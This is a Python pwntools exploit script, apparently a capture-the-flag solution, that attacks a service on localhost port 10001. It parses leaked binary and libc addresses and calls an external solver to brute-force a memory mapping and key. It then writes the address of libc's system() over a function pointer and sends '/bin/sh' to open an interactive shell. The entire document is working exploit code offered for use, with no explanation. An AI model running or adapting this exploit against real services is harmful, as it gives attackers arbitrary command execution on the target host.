#!/usr/bin/python

from pwn import *
import subprocess

context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

system_offset = 0x50d60

# p = process('./app')
p = remote('localhost', 10001)

# b *mmap
# b *system
# """)

p.recvuntil('0x')
bin_leak = int(p.recv(11), 16)
info(f'bin leak: {hex(bin_leak)}')

p.recvline()
p.recvline()

p.recvuntil('0x')
libc_leak = int(p.recv(11), 16)

info(f'libc leak: {hex(libc_leak)}')

s = subprocess.run(['../solve/target/release/solve', hex(bin_leak), hex(libc_leak)], capture_output=True)

info(s.stdout)

if len(s.stderr) != 0:
    error(s.stderr)
    exit(1)


lines = s.stdout.split(b'\n')

bin_bss = int(lines[0].split(b': ')[1], 16)
info(f'bin bss: 0x{hex(bin_bss)}')

bruted_map = int(lines[2].split(b': ')[1], 16)
info(f'bruted map: 0x{hex(bruted_map)}')

hex_key = lines[3].split(b': ')[1]
key = bytes.fromhex(hex_key.decode())[::-1]
info(f'hex key: {hex_key}, key: {key}')

p.sendlineafter(':> ', b'2')
p.sendlineafter('Key :> ', key)

libc_base = int(lines[4].split(b': ')[1], 16) - 0x1d2000
info(f'libc base: 0x{hex(libc_base)}')

size = (bin_leak - bruted_map) + 0x30 + 8
p.sendlineafter('Size :> ', str(size).encode())

p.recvuntil('Map: 0x')
map = int(p.recvline(), 16)

info(f'map: {hex(map)}')

p.sendlineafter(':> ', b'4')
p.sendlineafter('Index :> ', str(bin_leak-bruted_map+0x30))

p.write(p64(libc_base + system_offset))

p.sendlineafter(':> ', b'1')

p.sendlineafter(':> ', b'2')
p.sendafter('Key :> ', b'/bin/sh\x00')
p.sendlineafter('Size :> ', b'1')

p.sendline('ls')

p.recvall()

